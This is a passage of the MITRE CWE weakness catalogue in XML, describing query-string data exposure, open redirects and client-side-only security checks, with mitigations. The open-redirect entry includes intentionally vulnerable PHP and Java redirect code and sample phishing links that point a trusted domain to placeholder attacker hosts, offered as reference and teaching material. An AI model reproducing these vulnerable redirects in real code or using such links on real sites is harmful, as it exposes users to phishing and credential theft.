      <Weakness ID="598" Name="Use of GET Request Method With Sensitive Query Strings" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The web application uses the HTTP GET method to process a request and includes sensitive information in the query string of that request.</Description>
	 <Extended_Description>The query string for the URL could be saved in the browser's history, passed through Referers to other web sites, stored in web logs, or otherwise recorded in other sources.  If the query string contains sensitive information such as session identifiers, then attackers can use this information to launch further attacks.
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="201" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>At a minimum, attackers can garner information from query strings that can be utilized in escalating their method of attack, such as information about the internal workings of the application or database column names. Successful exploitation of query string parameter vulnerabilities could lead to an attacker impersonating a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When sensitive information is sent, use the POST method (e.g. registration form).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-12-15</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Information Leak Through GET Request</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Query Strings in GET Request</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Query Strings in GET Request</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="601" Name="URL Redirection to Untrusted Site ('Open Redirect')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.</Description>
         <Extended_Description>An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Open Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-site Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-domain Redirect</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Other</Impact>
               <Note>The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Other</Method>
               <Description>Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>Use a list of approved URLs or domains to be used for redirection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.2">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "/login.asp" and ID 2 could map to "http://www.example.com/". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code obtains a URL from the query string and then redirects the user to that URL.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$redirect_url = $_GET['url'];<xhtml:br/>header("Location: " . $redirect_url);</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://example.com/example.php?url=http://malicious.example.com</xhtml:div>
               </Example_Code>
               <Body_Text>The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class RedirectServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:div style="margin-left:1em;">String query = request.getQueryString();<xhtml:br/>if (query.contains("url")) {<xhtml:div style="margin-left:1em;">String url = request.getParameter("url");<xhtml:br/>response.sendRedirect(url);</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of a e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:</Body_Text>
               <Example_Code Nature="Attack" Language="HTML">
                  <xhtml:div>&lt;a href="http://bank.example.com/redirect?url=http://attacker.example.net"&gt;Click here to log in&lt;/a&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-4206</Reference>
               <Description>URL parameter loads the URL into a frame and causes it to appear to be part of a valid page.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-4206</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2951</Reference>
               <Description>An open redirect vulnerability in the search script in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL as a parameter to the proper function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2052</Reference>
               <Description>Open redirect vulnerability in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the proper parameter.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2052</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-11053</Reference>
               <Description>Chain: Go-based Oauth2 reverse proxy can send the authenticated user to another site at the end of the authentication flow. A redirect URL with HTML-encoded whitespace characters can bypass the validation (CWE-1289) to redirect to a malicious site (CWE-601)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-11053</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>38</Entry_ID>
               <Entry_Name>URl Redirector Abuse</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="178"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-483"/>
            <Reference External_Reference_ID="REF-484" Section="Page 43"/>
            <Reference External_Reference_ID="REF-485"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description, Detection_Factors, Likelihood_of_Exploit, Name, Relationships, Observed_Example, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-03</Modification_Date>
               <Modification_Comment>updated References and Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Observed_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Detection_Factors, Potential_Mitigations, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Unsafe URL Redirection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">URL Redirection to Untrusted Site</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">URL Redirection to Untrusted Site (aka 'Open Redirect')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="602" Name="Client-Side Enforcement of Server-Side Security" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.</Description>
         <Extended_Description>When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms, resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="471" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="290" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="300" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Consider a product that consists of two or more processes or nodes that must interact closely, such as a client/server model. If the product uses protection schemes in the client in order to defend from attacks against the server, and the server does not use the same schemes, then an attacker could modify the client in a way that bypasses those schemes. This is a fundamental design flaw that is primary to many weaknesses.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Availability</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>Client-side validation checks can be easily bypassed, allowing malformed or unexpected input to pass into the application, potentially as trusted data. This may lead to unexpected states, behaviors and possibly a resulting crash.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Client-side checks for authentication can be easily bypassed, allowing clients to escalate their access levels and perform unintended actions.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>
               </Description>
            </Mitigation>
